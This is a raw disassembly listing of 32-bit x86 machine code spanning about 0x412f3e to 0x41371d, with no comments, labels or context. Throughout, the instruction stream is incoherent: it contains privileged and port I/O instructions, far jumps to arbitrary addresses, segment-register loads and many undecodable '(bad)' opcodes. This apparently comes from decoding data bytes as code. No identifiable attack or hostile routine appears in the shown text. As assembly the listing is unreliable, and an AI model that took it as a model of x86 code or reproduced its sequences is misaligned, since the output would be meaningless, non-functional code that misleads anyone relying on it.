  412f3e:	pop    edi
  412f3f:	adc    ebx,DWORD PTR [edi+ecx*1+0x7f0936ae]
  412f46:	cld    
  412f47:	cld    
  412f48:	pop    ds
  412f49:	dec    edx
  412f4a:	cdq    
  412f4b:	mov    ah,0xab
  412f4d:	icebp  
  412f4e:	out    dx,eax
  412f4f:	rcl    DWORD PTR [eax],0x8e
  412f52:	mov    edx,0x95f7ffc5
  412f57:	sub    eax,0x524964ca
  412f5c:	(bad)  
  412f5e:	jnp    0x412f2c
  412f60:	test   al,0x91
  412f62:	ins    BYTE PTR es:[edi],dx
  412f63:	jae    0x412f11
  412f65:	sti    
  412f66:	cmp    al,dl
  412f68:	mov    eax,0x210ad57a
  412f6d:	jb     0x412fb5
  412f6f:	xor    DWORD PTR [ecx],ebp
  412f71:	push   0xe5e257d
  412f76:	cli    
  412f77:	xchg   ecx,eax
  412f78:	jae    0x412f09
  412f7a:	rcr    ah,cl
  412f7c:	mov    ecx,0x2065ea64
  412f81:	int    0x93
  412f83:	add    esp,esi
  412f85:	push   eax
  412f86:	cmp    eax,0x163764bb
  412f8b:	ins    DWORD PTR es:[edi],dx
  412f8c:	cli    
  412f8d:	dec    eax
  412f8e:	mov    ecx,0x7da5bfcc
  412f93:	imul   ebx,DWORD PTR [eax-0x2],0x8a01536e
  412f9a:	enter  0x740e,0xbb
  412f9e:	cmc    
  412f9f:	adc    BYTE PTR [eax+ebp*2+0x7e],ah
  412fa3:	push   ds
  412fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fa5:	push   edx
  412fa6:	or     DWORD PTR [ebx+ebx*1-0x59],eax
  412faa:	mov    edx,0xbf821b1f
  412faf:	mov    edx,0xa3cc09a7
  412fb4:	jle    0x412f6c
  412fb6:	xchg   esp,eax
  412fb7:	or     eax,0x842adac
  412fbc:	or     cl,bh
  412fbe:	lea    ebp,[edx]
  412fc0:	int    0x73
  412fc2:	sbb    DWORD PTR [ebx],ebx
  412fc4:	and    BYTE PTR [eax+esi*8-0x1366b4bf],0xc1
  412fcc:	mov    edx,0xe166220b
  412fd1:	push   0x7d422eea
  412fd6:	mov    ch,0xad
  412fd8:	gs clc 
  412fda:	adc    DWORD PTR [esi+ebp*1+0x2d],ecx
  412fde:	mov    eax,0x996ad3cf
  412fe3:	xor    ecx,DWORD PTR [eax+edx*1-0x322ad250]
  412fea:	arpl   WORD PTR [esi-0x7f],bp
  412fed:	js     0x412f85
  412fef:	in     eax,dx
  412ff0:	xchg   ebx,eax
  412ff1:	stos   BYTE PTR es:[edi],al
  412ff2:	add    edx,0x54
  412ff5:	fst    DWORD PTR [eax+0x8]
  412ff8:	add    eax,0x102cf87f
  412ffd:	test   al,0xe
  412fff:	jns    0x413039
  413001:	xchg   ecx,eax
  413002:	sub    al,0xbc
  413004:	lahf   
  413005:	stc    
  413006:	adc    DWORD PTR ds:0x153ee9e8,edx
  41300c:	pusha  
  41300d:	mov    bl,0xd7
  41300f:	xchg   edi,esp
  413011:	mov    es:0xbcbddc65,eax
  413017:	add    eax,0x46972228
  41301c:	pop    esp
  41301d:	rol    ebx,0x1b
  413020:	jle    0x412fa4
  413022:	rcr    edi,cl
  413024:	aaa    
  413025:	imul   ebx,DWORD PTR [ebx-0x6d],0x9
  413029:	cmp    BYTE PTR [ecx+ecx*2+0x14],bh
  41302d:	mov    ch,0x27
  41302f:	(bad)  
  413030:	xor    al,0x1f
  413032:	adc    bl,dh
  413034:	adc    ebp,DWORD PTR [esi+0x2b]
  413037:	(bad)  
  413038:	rep outs dx,DWORD PTR ds:[esi]
  41303a:	jno    0x412fdd
  41303c:	mov    DWORD PTR [eax+0x51],eax
  41303f:	aam    0xae
  413041:	stos   BYTE PTR es:[edi],al
  413042:	call   0x185433f1
  413047:	push   eax
  413048:	iret   
  413049:	cld    
  41304a:	ret    0xdc28
  41304d:	dec    ebx
  41304e:	push   edi
  41304f:	mov    fs,eax
  413051:	mov    bh,0x7b
  413053:	push   eax
  413054:	inc    eax
  413055:	adc    eax,0xa304f671
  41305a:	cmc    
  41305b:	addr16 out 0x9f,eax
  41305e:	(bad)  
  413060:	sub    eax,0x45960864
  413065:	adc    DWORD PTR [edi],ebx
  413067:	cmp    cl,BYTE PTR [ecx]
  413069:	mov    bh,dh
  41306b:	mov    al,ds:0x67d383da
  413070:	mov    ebx,0xe872f3c2
  413075:	mov    esp,0x34293c9c
  41307a:	pop    ecx
  41307b:	shr    DWORD PTR [ebx-0x44],cl
  41307e:	cdq    
  41307f:	call   0xf8fb:0xeff9b8b7
  413086:	dec    ebp
  413087:	jle    0x4130a6
  413089:	pop    ebx
  41308a:	out    dx,al
  41308b:	push   esi
  41308c:	adc    BYTE PTR [esi-0xc499f0d],ah
  413092:	add    DWORD PTR [edi-0x29],0xa9e406ae
  413099:	pop    edx
  41309a:	add    DWORD PTR [esi+0x7c],0xb66ffe88
  4130a1:	test   BYTE PTR [esi+0x3d],al
  4130a4:	xchg   edi,eax
  4130a5:	dec    edi
  4130a6:	add    dl,0x53
  4130a9:	test   cl,cl
  4130ab:	(bad)  
  4130ad:	jns    0x41312c
  4130af:	ret    0x4048
  4130b2:	adc    BYTE PTR [edi+0x48],dh
  4130b5:	fs inc ebx
  4130b7:	les    ebx,FWORD PTR [esi]
  4130b9:	adc    ebp,esp
  4130bb:	inc    esp
  4130bc:	add    dh,BYTE PTR [edx+0x6b]
  4130bf:	bound  ecx,QWORD PTR [edx-0x3ed5586e]
  4130c5:	mov    fs,WORD PTR [edi]
  4130c7:	sub    BYTE PTR cs:[esi+ebx*1-0x6c595dc9],0xd8
  4130d0:	xchg   esi,eax
  4130d1:	mov    DWORD PTR [ebx],ecx
  4130d3:	pop    esi
  4130d4:	inc    ecx
  4130d5:	rol    BYTE PTR [esi+0x569f75e5],1
  4130db:	test   DWORD PTR [ebx+eax*8-0x38],ebp
  4130df:	js     0x4130bc
  4130e1:	pop    ebx
  4130e2:	daa    
  4130e3:	retf   
  4130e4:	ret    0xba06
  4130e7:	scas   al,BYTE PTR es:[edi]
  4130e8:	pop    eax
  4130e9:	loop   0x4130c1
  4130eb:	jb     0x41314b
  4130ed:	sbb    esp,DWORD PTR [ebx]
  4130ef:	mov    esi,0x2f77b175
  4130f4:	xor    DWORD PTR [esi+0x30168e90],ebx
  4130fa:	sysret 
  4130fc:	pop    ecx
  4130fd:	clc    
  4130fe:	lahf   
  4130ff:	or     DWORD PTR [eax-0x26],ecx
  413102:	int    0x68
  413104:	lahf   
  413105:	sbb    al,0xcf
  413107:	and    ebp,ebp
  413109:	mov    eax,0x9432c831
  41310e:	adc    al,0x42
  413110:	lods   eax,DWORD PTR ds:[esi]
  413111:	fwait
  413112:	sbb    cl,0xe8
  413115:	das    
  413116:	shr    DWORD PTR [edi-0x197594e2],1
  41311c:	and    eax,0x1af09621
  413121:	mov    edx,0x44a86199
  413126:	imul   edx,DWORD PTR [ebp+esi*1-0x41],0xaaaafc10
  41312e:	dec    ebp
  41312f:	xchg   esi,ecx
  413131:	jbe    0x413144
  413133:	pop    ss
  413134:	adc    eax,0x4619532c
  413139:	mov    eax,ds:0x7bf3f226
  41313e:	fdivr  DWORD PTR [eax]
  413140:	scas   eax,DWORD PTR es:[edi]
  413141:	pusha  
  413142:	test   eax,0x9a5f8c55
  413147:	adc    BYTE PTR [ecx+eiz*1-0x518cf12a],bh
  41314e:	dec    edx
  41314f:	test   BYTE PTR [ecx+esi*8],ch
  413152:	mov    ebp,0xffbaa090
  413157:	std    
  413158:	jns    0x4131cc
  41315a:	cmp    BYTE PTR [ecx-0x5b],0xc
  41315e:	xchg   edi,eax
  41315f:	rol    ch,1
  413161:	pop    esp
  413162:	cwde   
  413163:	ins    BYTE PTR es:[edi],dx
  413164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413165:	gs ins DWORD PTR es:[edi],dx
  413167:	and    BYTE PTR [ecx+0x34f6f748],ah
  41316d:	loopne 0x413120
  41316f:	in     eax,dx
  413170:	fist   WORD PTR ds:[ebp+0x5bb6618]
  413177:	cmp    DWORD PTR [edx],edx
  413179:	sub    ebp,0x25
  41317c:	xor    BYTE PTR [eax-0x1f],bl
  41317f:	sbb    DWORD PTR [edx+0x4f],esi
  413182:	cld    
  413183:	(bad)  
  413184:	fimul  DWORD PTR [edi+eiz*1]
  413187:	ss ret 
  413189:	inc    eax
  41318a:	ins    DWORD PTR es:[edi],dx
  41318b:	dec    esp
  41318c:	xchg   ecx,eax
  41318d:	add    esp,DWORD PTR [edx]
  41318f:	sbb    esi,0xdb2d4698
  413195:	cmp    ebx,DWORD PTR [eax+esi*1-0x462a8ce8]
  41319c:	icebp  
  41319d:	iret   
  41319e:	pop    esp
  41319f:	jge    0x413214
  4131a1:	aam    0x85
  4131a3:	push   cs
  4131a4:	fimul  WORD PTR [ebp+0x8]
  4131a7:	iretw  
  4131a9:	or     al,0x87
  4131ab:	mov    ch,0x78
  4131ad:	es ins DWORD PTR es:[di],dx
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	jge    0x4131c7
  4131b4:	popf   
  4131b5:	fnstsw WORD PTR ds:0x240ce0cf
  4131bb:	push   0x3fe771f0
  4131c0:	aad    0x9f
  4131c2:	int    0xe3
  4131c4:	fld    TBYTE PTR [edi+0x67224cdf]
  4131ca:	aaa    
  4131cb:	adc    DWORD PTR [ebx+0x3f],ebx
  4131ce:	in     al,0x9c
  4131d0:	lea    esi,[eax+0x78]
  4131d3:	lock mov ah,0x21
  4131d6:	pop    edi
  4131d7:	lods   eax,DWORD PTR ds:[esi]
  4131d8:	and    eax,0xde7b12a8
  4131dd:	inc    edi
  4131de:	mov    BYTE PTR [esi-0x121c1388],ch
  4131e4:	out    0xbd,al
  4131e6:	jae    0x41325f
  4131e8:	stc    
  4131e9:	inc    ebx
  4131ea:	fwait
  4131eb:	push   0xffffff9b
  4131ed:	enter  0x71db,0x40
  4131f1:	pop    es
  4131f2:	mov    al,0xd7
  4131f4:	sbb    BYTE PTR [ebp-0x65],al
  4131f7:	jne    0x41320b
  4131f9:	repz inc ebp
  4131fb:	adc    esi,ebx
  4131fd:	sbb    BYTE PTR ds:0xb2a82b35,bh
  413203:	inc    ebx
  413204:	xchg   ecx,eax
  413205:	mov    cl,0x78
  413207:	in     al,0xd9
  413209:	(bad)  
  41320a:	push   eax
  41320b:	or     BYTE PTR [esi+edi*8],al
  41320e:	xchg   ebx,eax
  41320f:	ds xchg ebp,eax
  413211:	xchg   BYTE PTR [esi],ch
  413213:	icebp  
  413214:	fcomp  QWORD PTR [eax+0x5d]
  413217:	pop    ebx
  413218:	mov    ecx,0x396c54ed
  41321d:	(bad)  
  41321e:	cmc    
  41321f:	ins    DWORD PTR es:[edi],dx
  413220:	or     ah,dh
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	adc    BYTE PTR [eax+ebx*4+0x2f0a6853],ah
  41322a:	jp     0x413240
  41322c:	loope  0x4131db
  41322e:	ss enter 0xcc2f,0xa8
  413233:	ins    BYTE PTR es:[edi],dx
  413234:	adc    DWORD PTR [eax-0x75397a55],0xaff5958f
  41323e:	ins    BYTE PTR es:[edi],dx
  41323f:	mov    eax,ds:0x38963807
  413244:	cmc    
  413245:	pop    edi
  413246:	adc    BYTE PTR [esp+eax*1],bh
  413249:	push   esp
  41324a:	inc    eax
  41324b:	add    ecx,DWORD PTR [ebp+0xed15b48]
  413251:	ficomp WORD PTR [esi]
  413253:	fidivr DWORD PTR [ebp+0x72f71065]
  413259:	(bad)  
  41325a:	aas    
  41325b:	mul    BYTE PTR [ebx]
  41325d:	jae    0x41327a
  41325f:	retf   0x5072
  413262:	dec    edi
  413263:	and    DWORD PTR [ecx],ecx
  413265:	data16 and BYTE PTR [edx+0x2b],0xd8
  41326a:	cs std 
  41326c:	sub    eax,0x3070e9ac
  413271:	jmp    esp
  413273:	test   al,0xcb
  413275:	inc    esp
  413276:	mov    ebp,ecx
  413278:	sbb    dh,BYTE PTR [edi+eax*8-0x58]
  41327c:	sbb    al,bl
  41327e:	arpl   bp,ax
  413280:	fnstcw WORD PTR [ecx+0x24]
  413283:	outs   dx,BYTE PTR ds:[esi]
  413284:	and    ax,0x9cff
  413288:	fsubr  QWORD PTR [ebx+0x261332e5]
  41328e:	jns    0x4132dd
  413290:	dec    esp
  413291:	xchg   ebp,eax
  413292:	ret    
  413293:	sti    
  413294:	lods   al,BYTE PTR ds:[esi]
  413295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413296:	jmp    0x413253
  413298:	and    ah,dh
  41329a:	in     eax,dx
  41329b:	sub    dh,BYTE PTR [edx+0x3258ddc4]
  4132a1:	xor    eax,0xc1de6b41
  4132a6:	xchg   ecx,eax
  4132a7:	and    eax,0xf5d7c369
  4132ac:	jp     0x413250
  4132ae:	fsubrp st(3),st
  4132b0:	lods   al,BYTE PTR ds:[esi]
  4132b1:	mov    bh,0xad
  4132b3:	dec    esp
  4132b4:	add    al,0x72
  4132b6:	arpl   WORD PTR [ecx+ebx*2],si
  4132b9:	mov    edx,0x27161a1
  4132be:	push   edi
  4132bf:	addr16 iret 
  4132c1:	das    
  4132c2:	adc    cl,BYTE PTR [edi+0x5c8f0027]
  4132c8:	inc    eax
  4132c9:	sub    eax,0x36eb8622
  4132ce:	aaa    
  4132cf:	(bad)  
  4132d0:	mov    ss,WORD PTR [esi+0x48]
  4132d3:	stc    
  4132d4:	retf   
  4132d5:	dec    edx
  4132d6:	clc    
  4132d7:	sbb    al,0xf7
  4132d9:	jbe    0x41329a
  4132db:	lahf   
  4132dc:	je     0x4132ad
  4132de:	fnstsw WORD PTR ds:0x37e73f49
  4132e4:	mov    dh,0x66
  4132e6:	add    ch,BYTE PTR [ecx-0x7a]
  4132e9:	popf   
  4132ea:	mov    esi,0x98f2eb68
  4132ef:	aas    
  4132f0:	add    cl,cl
  4132f2:	dec    edi
  4132f3:	ret    
  4132f4:	aaa    
  4132f5:	mov    esi,0xeaaf5e0a
  4132fa:	add    ebp,DWORD PTR [ebp+0x69]
  4132fd:	mov    edx,DWORD PTR [ebx-0x18]
  413300:	or     dl,BYTE PTR [ebx-0x7c]
  413303:	pop    edx
  413304:	inc    ebp
  413305:	into   
  413306:	imul   ebp,DWORD PTR [ebx+0x410d9677],0x6baa0989
  413310:	mov    esi,0xa92aa646
  413315:	push   si
  413317:	(bad)  cs:[ecx]
  41331a:	sub    al,0x1
  41331c:	add    edx,ebx
  41331e:	lock out 0xe5,al
  413321:	std    
  413322:	aaa    
  413323:	pop    edx
  413324:	adc    DWORD PTR [ebx+0x44],0xa5f1b27c
  41332b:	xchg   edx,eax
  41332c:	pop    edx
  41332d:	dec    eax
  41332e:	jl     0x41330b
  413330:	jae    0x4132e9
  413332:	out    0xa9,eax
  413334:	cmp    BYTE PTR [ebx+0x2a],ch
  413337:	xchg   ebx,eax
  413338:	ja     0x413372
  41333a:	fimul  WORD PTR [esi-0xd]
  41333d:	outs   dx,DWORD PTR ds:[esi]
  41333e:	sbb    al,0x70
  413340:	jns    0x413365
  413342:	hlt    
  413343:	pop    edi
  413344:	add    al,BYTE PTR [esi-0x1c]
  413347:	jmp    0x7d5f:0x36e4273a
  41334e:	mov    cl,BYTE PTR ds:0x34c3ae60
  413354:	ja     0x4132eb
  413356:	mov    dl,0xc3
  413358:	mov    ecx,0x2feed959
  41335d:	ins    BYTE PTR es:[edi],dx
  41335e:	clc    
  41335f:	sub    ah,BYTE PTR [eax-0x36]
  413362:	add    al,0x95
  413364:	(bad)  
  413365:	cs cdq 
  413367:	loopne 0x4133ba
  413369:	cmp    esi,DWORD PTR [ebp-0x2837b994]
  41336f:	test   eax,0x8be3e655
  413374:	pop    ecx
  413375:	push   es
  413376:	mul    BYTE PTR [eax-0x1d]
  413379:	adc    al,0x31
  41337b:	push   ds
  41337c:	dec    ecx
  41337d:	jl     0x413301
  41337f:	(bad)  
  413380:	adc    al,0xe
  413382:	daa    
  413383:	push   ds
  413384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413385:	xchg   edi,eax
  413386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413387:	icebp  
  413388:	das    
  413389:	jnp    0x413341
  41338b:	xor    al,0x7
  41338d:	cwde   
  41338e:	or     ah,BYTE PTR [edi+0x242a1787]
  413394:	xchg   ecx,eax
  413395:	inc    BYTE PTR [esi+edi*1]
  413398:	out    dx,eax
  413399:	imul   esi,DWORD PTR [edi+0x4b],0x4e
  41339d:	mov    edi,DWORD PTR [ecx]
  41339f:	cmp    BYTE PTR [ecx+0x11],bh
  4133a2:	(bad)
  4133a5:	das    
  4133a6:	sub    al,0x21
  4133a8:	and    DWORD PTR [eax+0x5ff0a146],edx
  4133ae:	add    al,0xa5
  4133b0:	fwait
  4133b1:	xchg   ebx,eax
  4133b2:	bound  eax,QWORD PTR [ebx+0x76fc581b]
  4133b8:	jbe    0x4133f9
  4133ba:	cmp    al,0xf7
  4133bc:	paddsb mm2,mm7
  4133bf:	sti    
  4133c0:	loop   0x413347
  4133c2:	mov    edx,edi
  4133c4:	cmp    ebx,edi
  4133c6:	call   0xc1a27860
  4133cb:	sahf   
  4133cc:	and    BYTE PTR ds:0x3c265f96,0x4
  4133d3:	xchg   edx,eax
  4133d4:	add    BYTE PTR [edx-0x54],al
  4133d7:	push   ds
  4133d8:	mov    WORD PTR [esi+0x7b131900],ds
  4133de:	mov    edx,0x459c439f
  4133e3:	lock mov edi,0xbf37d1f8
  4133e9:	pop    esp
  4133ea:	cmp    al,0xc2
  4133ec:	cmp    al,0x1a
  4133ee:	lods   eax,DWORD PTR ds:[esi]
  4133ef:	ins    DWORD PTR es:[edi],dx
  4133f0:	pop    edx
  4133f1:	sbb    DWORD PTR [ecx],eax
  4133f3:	call   0x87aaac83
  4133f8:	and    bh,dl
  4133fa:	add    DWORD PTR [ebp-0x51],ebp
  4133fd:	daa    
  4133fe:	rcl    BYTE PTR [edi-0x7],cl
  413401:	mov    esi,0x326aaa56
  413406:	and    eax,0x1239c38b
  41340b:	loope  0x4133c7
  41340d:	push   ds
  41340e:	mov    ecx,0x9efd1a14
  413413:	scas   al,BYTE PTR es:[edi]
  413414:	mov    ?,WORD PTR [ecx]
  413416:	sahf   
  413417:	bound  sp,DWORD PTR [edi]
  41341a:	jae    0x4133c3
  41341c:	and    ah,dl
  41341e:	sub    bl,BYTE PTR [edi+ebp*4]
  413421:	pop    edi
  413422:	lods   eax,DWORD PTR ds:[esi]
  413423:	clc    
  413424:	in     eax,0x3d
  413426:	cwde   
  413427:	rcr    BYTE PTR [eax+0x0],0x2
  41342b:	ret    0xb5fd
  41342e:	push   ebp
  41342f:	test   eax,0x5169cc3d
  413434:	sub    bl,ah
  413436:	retf   0xe664
  413439:	xchg   ebx,eax
  41343a:	jmp    0x2c6e7648
  41343f:	test   eax,0x103b9747
  413444:	fadd   DWORD PTR [eax-0x78]
  413447:	cwde   
  413448:	pop    edi
  413449:	mov    dl,0x34
  41344b:	sbb    al,BYTE PTR [edx]
  41344d:	push   es
  41344e:	leave  
  41344f:	popa   
  413450:	push   ss
  413451:	shl    ecx,cl
  413453:	mov    esp,0x24245c48
  413458:	ins    BYTE PTR es:[edi],dx
  413459:	in     al,dx
  41345a:	popa   
  41345b:	pop    ebx
  41345c:	xor    DWORD PTR [esi-0x2],esi
  41345f:	std    
  413460:	fcom   QWORD PTR [ebx-0x26]
  413463:	(bad)
  413466:	lds    ecx,FWORD PTR [edi+0x52]
  413469:	adc    BYTE PTR [ebx],dh
  41346b:	inc    esi
  41346c:	call   0x629161cb
  413471:	xchg   edx,eax
  413472:	int3   
  413473:	jecxz  0x413444
  413475:	adc    DWORD PTR [ecx+0x12],esp
  413478:	cdq    
  413479:	cmp    eax,0x48806dd
  41347e:	enter  0x9b6c,0x21
  413482:	mov    eax,0x4f85d086
  413487:	jne    0x413470
  413489:	mov    esp,0x164e96c6
  41348e:	mov    bh,0x37
  413490:	arpl   WORD PTR cs:[esi+esi*2+0x48],bp
  413495:	xchg   ebp,eax
  413496:	and    DWORD PTR [eax-0x18],esi
  413499:	sub    eax,0x746a90a1
  41349e:	loopne 0x4134d4
  4134a0:	xor    ah,ah
  4134a2:	pop    edx
  4134a3:	call   0x622bac49
  4134a8:	xchg   ebp,eax
  4134a9:	mov    bh,BYTE PTR [ecx-0x46e20487]
  4134af:	mov    bl,0xd9
  4134b1:	mov    dh,0x75
  4134b3:	inc    eax
  4134b4:	jno    0x4134d2
  4134b6:	push   edi
  4134b7:	lock cdq 
  4134b9:	jmp    0x413448
  4134bb:	pusha  
  4134bc:	(bad)  
  4134bd:	cmp    ch,BYTE PTR [eax-0x1e88c9d1]
  4134c3:	out    dx,eax
  4134c4:	xchg   ebp,eax
  4134c5:	pop    esp
  4134c6:	fs jnp 0x4134aa
  4134c9:	scas   al,BYTE PTR es:[edi]
  4134ca:	lea    esp,[edi+0x759a029a]
  4134d0:	mov    eax,0x8576d6c8
  4134d5:	cmp    bl,BYTE PTR [esi+0x685af036]
  4134db:	nop
  4134dc:	dec    esi
  4134dd:	sub    edx,DWORD PTR [eax+ebx*2]
  4134e0:	sahf   
  4134e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134e2:	jp     0x413490
  4134e4:	push   ebp
  4134e5:	stc    
  4134e6:	add    dl,BYTE PTR [esi]
  4134e8:	imul   edx,DWORD PTR [ebx+edi*2+0x6a0bfbac],0xe266b84f
  4134f3:	je     0x413490
  4134f5:	fidiv  WORD PTR [eax]
  4134f7:	push   edx
  4134f8:	add    al,cl
  4134fa:	lods   al,BYTE PTR ds:[esi]
  4134fb:	bound  ecx,QWORD PTR [esi+edx*2+0x4c9adabc]
  413502:	ja     0x413551
  413504:	or     BYTE PTR [ebx+eax*2+0x6e39e6c3],ch
  41350b:	je     0x413556
  41350d:	dec    ebp
  41350e:	add    DWORD PTR [ebx],ecx
  413510:	movups xmm2,xmm1
  413513:	aaa    
  413514:	jae    0x4134a2
  413516:	pop    ds
  413517:	sub    BYTE PTR [edi+0x2ce6595d],bl
  41351d:	xor    al,0xa8
  41351f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413520:	(bad)  
  413521:	ret    0x664b
  413524:	xchg   ebp,eax
  413525:	sti    
  413526:	mov    ebx,0xcbb08fdd
  41352b:	inc    edi
  41352c:	push   es
  41352d:	sbb    esi,DWORD PTR [ecx]
  41352f:	test   DWORD PTR ds:[ecx],ebx
  413532:	fsubr  QWORD PTR [esi+0x6e4b3227]
  413538:	sub    ch,0x5
  41353b:	icebp  
  41353c:	ss retf 
  41353e:	ror    DWORD PTR [edi-0x303d3362],cl
  413544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413545:	jp     0x413587
  413547:	sti    
  413548:	es stc 
  41354a:	aaa    
  41354b:	loop   0x4135c8
  41354d:	(bad)  
  41354e:	lahf   
  41354f:	clc    
  413550:	aaa    
  413551:	jecxz  0x4134d4
  413553:	jecxz  0x41352e
  413555:	jg     0x4134ed
  413557:	cmp    DWORD PTR [ebp-0x5c],edx
  41355a:	scas   al,BYTE PTR es:[edi]
  41355b:	adc    eax,0x1e3e4284
  413560:	pop    edi
  413561:	pop    edx
  413562:	rcl    BYTE PTR [ecx*8-0x74dea020],1
  413569:	or     esp,eax
  41356b:	(bad)  
  41356c:	leave  
  41356d:	mov    ebx,0x614fef1e
  413572:	int3   
  413573:	inc    ebp
  413574:	or     ah,ch
  413576:	cmp    edx,0x26
  413579:	inc    edx
  41357a:	add    ax,0xff17
  41357e:	mov    ecx,0xbe483264
  413583:	ins    BYTE PTR es:[edi],dx
  413584:	or     DWORD PTR [ebp+0x7],edx
  413587:	outs   dx,BYTE PTR ds:[esi]
  413588:	cld    
  413589:	xchg   ebp,eax
  41358a:	sub    BYTE PTR [ebx-0x591abe50],dh
  413590:	out    0x6c,eax
  413592:	push   0x5724dac5
  413597:	test   BYTE PTR [esi-0x64],0x88
  41359b:	push   ds
  41359c:	or     ch,BYTE PTR [edi-0x52]
  41359f:	adc    al,BYTE PTR [ebx]
  4135a1:	std    
  4135a2:	cwde   
  4135a3:	mov    cl,0x68
  4135a5:	or     DWORD PTR [eax],ebx
  4135a7:	bound  ecx,QWORD PTR [esi-0x74]
  4135aa:	inc    ecx
  4135ab:	jbe    0x41354d
  4135ad:	push   edi
  4135ae:	data16 xor al,0x45
  4135b1:	int3   
  4135b2:	mov    ds:0x4e7b1204,eax
  4135b7:	es dec ecx
  4135b9:	mov    ah,0xd
  4135bb:	mov    DWORD PTR [ebp+0x7bb14e16],eax
  4135c1:	jp     0x4135c6
  4135c3:	sar    BYTE PTR [esi+0x7e],0x9
  4135c7:	in     eax,0x7a
  4135c9:	in     al,0xe2
  4135cb:	pop    es
  4135cc:	scas   eax,DWORD PTR es:[edi]
  4135cd:	cli    
  4135ce:	loope  0x413608
  4135d0:	adc    ah,BYTE PTR [esi-0x17]
  4135d3:	jae    0x413557
  4135d5:	(bad)  [eax+0x7dbc56a6]
  4135db:	sub    al,0x90
  4135dd:	rcr    ebp,cl
  4135df:	push   esi
  4135e0:	pusha  
  4135e1:	or     eax,0x43a56961
  4135e6:	ffree  st(4)
  4135e8:	arpl   WORD PTR [ecx+0x5f6caa2a],di
  4135ee:	xor    al,0xd6
  4135f0:	test   dl,al
  4135f2:	ret    
  4135f3:	sbb    eax,0x67da2943
  4135f8:	aas    
  4135f9:	push   esi
  4135fa:	pop    es
  4135fb:	xchg   esp,eax
  4135fc:	das    
  4135fd:	pop    edi
  4135fe:	retf   0x66a9
  413601:	cli    
  413602:	cld    
  413603:	add    ebx,edi
  413605:	mov    ecx,0x75ffb103
  41360a:	loopne 0x413594
  41360c:	dec    esp
  41360d:	cdq    
  41360e:	cmp    edx,DWORD PTR [esi+0x17]
  413611:	xchg   DWORD PTR [edx+0x6fac1c5c],edx
  413617:	pop    esi
  413618:	and    esi,DWORD PTR [edi+edi*2+0x46]
  41361c:	jecxz  0x413663
  41361e:	inc    ebp
  41361f:	arpl   WORD PTR [edx+0x78b101c3],sp
  413625:	jle    0x4135e4
  413627:	repnz div BYTE PTR fs:[edx+0x14fdaa9c]
  41362f:	mov    dl,0x8c
  413631:	mov    ds:0xf03d8f40,eax
  413636:	mov    ecx,0x43db4efb
  41363b:	inc    esp
  41363c:	test   edi,ecx
  41363e:	dec    edi
  41363f:	push   esp
  413640:	rcr    DWORD PTR ds:0x79332d3e,0xbc
  413647:	shl    BYTE PTR [ebx-0x7d],1
  41364a:	fbstp  TBYTE PTR [esi]
  41364c:	cmp    bh,ah
  41364e:	fdiv   DWORD PTR [ecx]
  413650:	rol    BYTE PTR [ecx+0x47],0x30
  413654:	cmp    BYTE PTR [esi+0x51],ch
  413657:	mov    ebx,0x1fb3d91d
  41365c:	dec    ecx
  41365d:	(bad)  
  41365f:	loopne 0x4136db
  413661:	out    0xec,al
  413663:	stos   DWORD PTR es:[edi],eax
  413664:	popa   
  413665:	dec    ebp
  413666:	inc    esp
  413667:	dec    eax
  413668:	data16 sub al,0x60
  41366b:	mov    dh,0x3b
  41366d:	or     eax,0x93965a5
  413672:	cwde   
  413673:	mov    edx,0x743f29fd
  413678:	pop    ebp
  413679:	fstp   TBYTE PTR [eax]
  41367b:	adc    BYTE PTR [edi],cl
  41367d:	jnp    0x4136e9
  41367f:	mov    esp,0xe7e69f47
  413684:	jmp    0xcc30:0xae95641b
  41368b:	mov    ecx,0xa18d6f08
  413690:	test   ebp,0x3ca657ca
  413696:	jnp    0x4136f4
  413698:	fist   DWORD PTR [edx-0x3f2af19e]
  41369e:	or     DWORD PTR [eax+0xc],esp
  4136a1:	and    edx,DWORD PTR [edx-0x16]
  4136a4:	xchg   ebx,eax
  4136a5:	mov    cl,BYTE PTR [edi+0x7b]
  4136a8:	mov    bl,0x3a
  4136aa:	aam    0xf0
  4136ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136ad:	in     eax,0x34
  4136af:	(bad)  
  4136b1:	nop
  4136b2:	inc    ecx
  4136b3:	retf   0xe0b2
  4136b6:	adc    al,0xc7
  4136b8:	mov    fs,WORD PTR ds:[ebx]
  4136bb:	adc    ebx,DWORD PTR [eax+0x26]
  4136be:	mov    edx,0x6f4cdfdb
  4136c3:	pop    edi
  4136c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136c5:	sub    BYTE PTR [ebp+0x32],ah
  4136c8:	fiadd  DWORD PTR [ecx-0x34]
  4136cb:	aad    0x7e
  4136cd:	sub    BYTE PTR [edi-0x3208827a],cl
  4136d3:	inc    esp
  4136d4:	std    
  4136d5:	(bad)  
  4136d6:	cmc    
  4136d7:	pusha  
  4136d8:	mov    al,ds:0x9d66119e
  4136dd:	fld    st(0)
  4136df:	cmp    ecx,DWORD PTR [edx+0x3ef118ba]
  4136e5:	into   
  4136e6:	xor    esi,ecx
  4136e8:	and    eax,ecx
  4136ea:	push   esp
  4136eb:	and    al,0x3d
  4136ed:	call   0xf8048754
  4136f2:	inc    eax
  4136f3:	out    dx,al
  4136f4:	add    eax,0x5428a6cf
  4136f9:	popf   
  4136fa:	jle    0x41367e
  4136fc:	enter  0x9f35,0x39
  413700:	jmp    0x6cc0:0xf8ba29e
  413707:	push   eax
  413708:	add    DWORD PTR [ebx-0x68],edx
  41370b:	scas   al,BYTE PTR es:[edi]
  41370c:	and    BYTE PTR [edx-0x6f],0x42
  413710:	inc    edx
  413711:	repnz sbb bl,BYTE PTR [esi]
  413714:	pop    ss
  413715:	sub    BYTE PTR [ebx],cl
  413717:	mov    bh,al
  413719:	xor    edx,DWORD PTR [ecx+edx*1]
  41371c:	inc    eax
  41371d:	ins    BYTE PTR es:[edi],dx
